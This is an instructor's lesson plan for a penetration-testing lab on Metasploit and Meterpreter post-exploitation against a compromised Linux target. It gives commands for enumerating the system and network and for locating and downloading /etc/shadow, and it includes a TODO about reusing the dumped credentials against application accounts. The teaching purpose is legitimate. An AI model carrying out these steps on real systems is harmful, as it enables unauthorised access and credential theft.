### Guided Practice: First Steps with Meterpreter (0:10)
Instruct students to launch the lab, then work through **Part 17 — SSH Exploitation**. They will _not_ follow the instructions provided in the lab. Instead, slack out the instructions below.

**Isaac TODO**: Add some questions about what students might use some of this information for. Idea is to get them thinking about what the next steps would be. Ideally think of something realistic (i.e., using dumped creds to attack application accounts, etc.)

---
**Instructions**
- In Metasploit, run: `search post/linux/gather`. This lists all the modules you can run on compromised Linux machines to gather information.
- Find the following information about your target:
  - Get system and user information
  - Get network information
  - Enumerate available commands
  - Enumerate configurations
- Next, connect directly to your Meterpreter session. Find the following information about your target:
  - Current working directory
  - Current User ID
  - System information
  - List all network interfaces (**this is important**)
  - Use `search` to locate the `shadow` file
  - Use `download` to download `shadow`

### Direct Instruction: Review First Steps with Meterpreter (0:10)
#### Using Post-Exploitation Modules
- Explain that students must use the following modules to gather information:
  - `post/linux/gather/enum_commands`
  - `post/linux/gather/enum_configs`
  - `post/linux/gather/enum_network`
  - `post/linux/gather/enum_system`

You run each of these modules the same way: First `use` them, then `set SESSION 1` and `run -j`.

**Isaac TODO**: Document output/what students should find

#### Interacting with the Session
- Explain that, to connect to the session, run: `sessions -i 1`. Then, run the commands below to gather the information you need.

  ```bash
  meterpreter> getwd
  meterpreter> getuid
  meterpreter> sysinfo
  meterpreter> ifconfig
  meterpreter> search shadow
  meterpreter> download /etc/shadow
  ```

- Take a moment to address remaining questions before proceeding.
